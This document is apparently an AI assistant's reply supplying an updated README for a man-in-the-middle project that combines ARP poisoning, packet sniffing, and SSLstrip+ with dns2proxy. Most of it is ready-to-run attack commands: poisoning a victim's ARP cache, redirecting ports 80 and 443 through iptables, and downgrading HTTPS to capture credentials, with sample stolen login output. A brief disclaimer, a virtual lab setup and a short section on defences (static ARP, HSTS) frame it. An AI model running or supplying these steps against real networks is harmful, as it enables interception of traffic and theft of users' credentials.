Thanks! Here's the updated **README**, now including information on sniffing HTTPS traffic using **dns2proxy** and **SSLstrip+**.  

---

# **MITM Attack Using ARP Poisoning & Packet Sniffing**  

## **📌 Overview**  
This project demonstrates a **Man-in-the-Middle (MITM) attack** using:  
- **ARP Poisoning**: Redirects network traffic through the attacker's machine.  
- **Packet Sniffing**: Captures and analyzes intercepted HTTP traffic.  

⚠️ **Disclaimer:** This project is for **educational purposes only**. Do not use it on unauthorized networks.  

---

## **🛠️ Setup & Installation**  

### **1️⃣ Install Dependencies**  
Ensure you have Python and Scapy installed:  
```bash
sudo apt update
sudo apt install python3-pip
pip3 install scapy
```

### **2️⃣ Network Configuration**  
- Use **VirtualBox NAT Network** to connect both machines.  
- The target machine should have **internet access**.  

To check IP addresses:  
```bash
ip a
```

---

## **🚀 Running the Attack**  

### **1️⃣ Start ARP Poisoning**  
Replace `TARGET_IP` with the victim’s IP and `GATEWAY_IP` with the router's IP:  
```bash
sudo python3 arp_poisoning.py -t TARGET_IP -p GATEWAY_IP
```

This tricks the victim into sending traffic through the attacker’s machine.  

---

### **2️⃣ Start Packet Sniffing**  
Find your network interface (`ifconfig` or `ip a`), then start sniffing:  
```bash
sudo python3 packet_sniffer.py
```

This captures **HTTP requests** and extracts potential sensitive data.  

---

## **🔄 Running Both Scripts Together**  
You can run both scripts simultaneously using:  
```bash
sudo python3 arp_poisoning.py -t TARGET_IP -p GATEWAY_IP &  
sudo python3 packet_sniffer.py  
```

- The `&` runs **ARP Poisoning in the background**.  
- The **sniffer runs in the foreground**, showing captured packets.  

---

## **📌 Expected Results**  
If successful:  
✅ The victim’s internet **slows down or stops working**.  
✅ The attacker sees **captured HTTP data** (e.g., credentials).  

🔹 **Example Output** from Packet Sniffer:  
```
b'username=admin&password=123456'
```

---

## **🔐 Sniffing HTTPS Traffic (Bypassing HTTPS Security)**  
Since most websites use **HTTPS**, normal packet sniffing will not capture useful data. To intercept encrypted traffic, use **SSLstrip+ and dns2proxy**.

### **1️⃣ Install SSLstrip+ and dns2proxy**  
```bash
git clone https://github.com/LeonardoNve/dns2proxy.git
git clone https://github.com/moxie0/sslstrip.git
cd sslstrip
sudo python3 setup.py install
```

### **2️⃣ Enable IP Forwarding & Redirect Traffic**  
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
```

### **3️⃣ Run dns2proxy**  
```bash
cd dns2proxy
sudo python3 dns2proxy.py
```

### **4️⃣ Run SSLstrip+**  
```bash
sudo sslstrip -l 8080
```

Now, encrypted HTTPS traffic will be downgraded to HTTP, allowing **MITM attacks** to capture sensitive data.  

---

## **🛑 Stopping the Attack**  
Press `CTRL+C` to stop both scripts. The ARP table will automatically reset.  

To disable IP forwarding:  
```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

To clear iptables rules:  
```bash
sudo iptables --flush
```

---

## **🛡️ How to Protect Against ARP Spoofing?**  
- Use **static ARP tables** (`arp -s <IP> <MAC>`).  
- Enable **ARP Spoofing Protection** in your firewall.  
- Always use **HTTPS** instead of HTTP.  
- Implement **HSTS (HTTP Strict Transport Security)** to prevent SSLstrip attacks.  

---

## **📎 Notes**  
- This method **only works on HTTP traffic** (not HTTPS) unless SSLstrip+ is used.  
- The **MITM attack will disrupt** the victim’s internet connection.  
- If the **victim's internet completely stops**, lower the attack rate by adding a `time.sleep(5)` in `arp_poisoning.py`.  

---

## **👨‍💻 Author**  
Developed by **Ahmet Önal** for educational cybersecurity research.  

🚀 **Ethical hacking is a responsibility. Use wisely!**  

---

This README now includes **SSLstrip+ and dns2proxy** for HTTPS interception. Let me know if you need further refinements! 🚀
